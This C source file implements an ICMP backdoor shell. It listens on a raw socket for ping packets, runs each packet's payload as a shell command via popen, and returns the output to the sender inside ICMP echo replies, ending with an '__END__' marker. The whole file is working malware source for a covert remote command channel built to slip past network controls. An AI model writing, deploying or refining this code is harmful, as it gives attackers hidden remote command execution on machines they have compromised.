#define _POSIX_C_SOURCE 200809L
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <errno.h>
#include <time.h>
#include "icmp_common.h"

#define BUFSIZE 4096
#define END_MARKER "__END__"

// Send ICMP response with payload (without IP_HDRINCL)
int send_icmp_response(int sock, struct sockaddr_in *client_addr, const char *data, int data_len, uint16_t original_id) {
    char packet[BUFSIZE];
    struct icmp_header *icmp_hdr = (struct icmp_header *)packet;
    
    // Build ICMP echo reply - USE THE ORIGINAL ID FROM THE REQUEST
    icmp_hdr->type = ICMP_ECHOREPLY;
    icmp_hdr->code = 0;
    icmp_hdr->un.echo.id = original_id;  // Use the ID from the request
    icmp_hdr->un.echo.sequence = 0;
    
    // Copy data to payload
    if (data_len > 0 && data_len < (int)(BUFSIZE - sizeof(struct icmp_header))) {
        memcpy(packet + sizeof(struct icmp_header), data, data_len);
    }
    
    // Calculate checksum
    icmp_hdr->checksum = 0;
    icmp_hdr->checksum = checksum((unsigned short *)icmp_hdr, 
                                 sizeof(struct icmp_header) + data_len);

    // Send the packet
    return sendto(sock, packet, sizeof(struct icmp_header) + data_len, 0,
                 (struct sockaddr *)client_addr, sizeof(struct sockaddr_in));
}

void handle_icmp_shell(int sock) {
    char buffer[BUFSIZE];
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    
    printf("[*] ICMP shell active. Waiting for commands...\n");

    while (1) {
        memset(buffer, 0, BUFSIZE);
        
        // Receive ICMP packet
        ssize_t n = recvfrom(sock, buffer, BUFSIZE, 0,
                           (struct sockaddr *)&client_addr, &addr_len);
        if (n <= 0) {
            if (errno == EINTR) continue;
            printf("[*] Error receiving packet: %s\n", strerror(errno));
            break;
        }

        // Parse IP header to get ICMP payload
        struct iphdr *ip_header = (struct iphdr *)buffer;
        int ip_header_len = ip_header->ihl * 4;
        
        if (n < ip_header_len + (int)sizeof(struct icmp_header)) {
            printf("[!] Incomplete packet received\n");
            continue; // Not a complete ICMP packet
        }

        struct icmp_header *icmp_hdr = (struct icmp_header *)(buffer + ip_header_len);
        
        // Only process echo requests (ICMP_ECHO)
        if (icmp_hdr->type != ICMP_ECHO) {
            //printf("[!] Not an echo request: type=%d\n", icmp_hdr->type);
            continue;
        }

        // Store the original ID from the request
        uint16_t original_id = icmp_hdr->un.echo.id;

        char *command = (char *)(icmp_hdr + 1);
        int command_len = n - ip_header_len - sizeof(struct icmp_header);

        if (command_len > 0) {
            // Ensure null termination for safety
            if ((size_t)command_len >= BUFSIZE - ip_header_len - sizeof(struct icmp_header)) {
            //if (command_len >= BUFSIZE - ip_header_len - sizeof(struct icmp_header)) {
                command_len = BUFSIZE - ip_header_len - sizeof(struct icmp_header) - 1;
            }
            command[command_len] = '\0';
            
            //printf("[*] Received command: %s (len=%d, id=%d)\n", command, command_len, original_id);
            
            // Execute command
            FILE *fp = popen(command, "r");
            if (!fp) {
                const char *err = "Failed to run command\n";
                printf("[!] Command failed: %s\n", command);
                send_icmp_response(sock, &client_addr, err, strlen(err), original_id);
            } else {
                char line[BUFSIZE];
                size_t bytes_sent = 0;
                while (fgets(line, sizeof(line), fp)) {
                    int line_len = strlen(line);
                    if (send_icmp_response(sock, &client_addr, line, line_len, original_id) < 0) {
                        perror("send_icmp_response");
                        break;
                    }
                    bytes_sent += line_len;
                    usleep(10000); // Small delay between packets
                }
                pclose(fp);
                //printf("[+] Sent %zu bytes for command: %s\n", bytes_sent, command);
            }
            
            // Send end marker
            if (send_icmp_response(sock, &client_addr, END_MARKER, strlen(END_MARKER), original_id) < 0) {
                perror("send_icmp_response end marker");
            }
        } else {
            printf("[!] Empty command received\n");
        }
    }
}

int perform_action() {
    int sock;
    
    // Create raw socket for ICMP (without IP_HDRINCL - let kernel handle IP header)
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("socket");
        exit(1);
    }
    
    // We need to be root to create raw sockets
    if (getuid() != 0) {
        printf("[!] Warning: ICMP shell requires root privileges\n");
        printf("[!] Some functionality may not work without root\n");
    }

    printf("[*] ICMP shell listening (PID: %d)...\n", getpid());
    handle_icmp_shell(sock);
    
    close(sock);
    return 0;
}
